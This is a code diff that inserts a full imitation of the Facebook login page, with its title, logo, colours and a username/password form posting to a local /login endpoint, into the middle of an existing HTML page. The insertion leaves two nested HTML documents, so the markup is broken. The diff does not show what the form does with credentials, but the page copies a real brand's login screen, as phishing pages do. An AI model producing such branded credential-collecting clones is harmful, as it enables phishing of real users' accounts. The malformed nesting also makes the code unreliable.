@@ -109,7 +109,122 @@ body {
     </div>
     <p class="page-link">
       <a href="#">Create a Page</a> for a celebrity, brand or business.
+    </p><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <style>
+  
+  * {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #f0f2f5;
+}
+
+.wrapper {
+  max-width: 400px;
+  margin: auto;
+  padding: 40px 20px;
+  text-align: center;
+}
+
+.logo {
+  color: #1877f2;
+  font-size: 48px;
+  font-weight: bold;
+  margin-bottom: 20px;
+}
+
+.login-box {
+  background-color: white;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+.login-box input {
+  width: 100%;
+  padding: 12px;
+  margin: 10px 0;
+  font-size: 16px;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+}
+
+.login-btn {
+  width: 100%;
+  padding: 12px;
+  background-color: #1877f2;
+  color: white;
+  font-size: 16px;
+  border: none;
+  border-radius: 6px;
+  margin-top: 10px;
+}
+
+.forgot {
+  display: block;
+  color: #1877f2;
+  font-size: 14px;
+  margin: 15px 0;
+  text-decoration: none;
+}
+
+.divider {
+  border-top: 1px solid #ccc;
+  margin: 20px 0;
+}
+
+.create-btn {
+  width: 100%;
+  padding: 12px;
+  background-color: #42b72a;
+  color: white;
+  font-size: 16px;
+  border: none;
+  border-radius: 6px;
+}
+
+.page-link {
+  font-size: 14px;
+  margin-top: 20px;
+}
+
+.page-link a {
+  color: #1877f2;
+  text-decoration: none;
+  font-weight: bold;
+}
+  
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <h1 class="logo">facebook</h1>
+    <div class="login-box">
+    <form action="/login" method="POST">
+      <input type="text" id="username" name="username" placeholder="Mobile number or email" required />
+      <input type="password" id="password" name="password" placeholder="Password" required />
+      <input type="submit" class="login-btn" value="Log In">
+    </form>
+      <a href="#" class="forgot">Forgotten password?</a>
+      <div class="divider"></div>
+      <button class="create-btn">Create New Account</button>
+    </div>
+    <p class="page-link">
+      <a href="#">Create a Page</a> for a celebrity, brand or business.
     </p>
+  </div>
+</body>
+</html>
+
   </div>
 </body>
 </html>
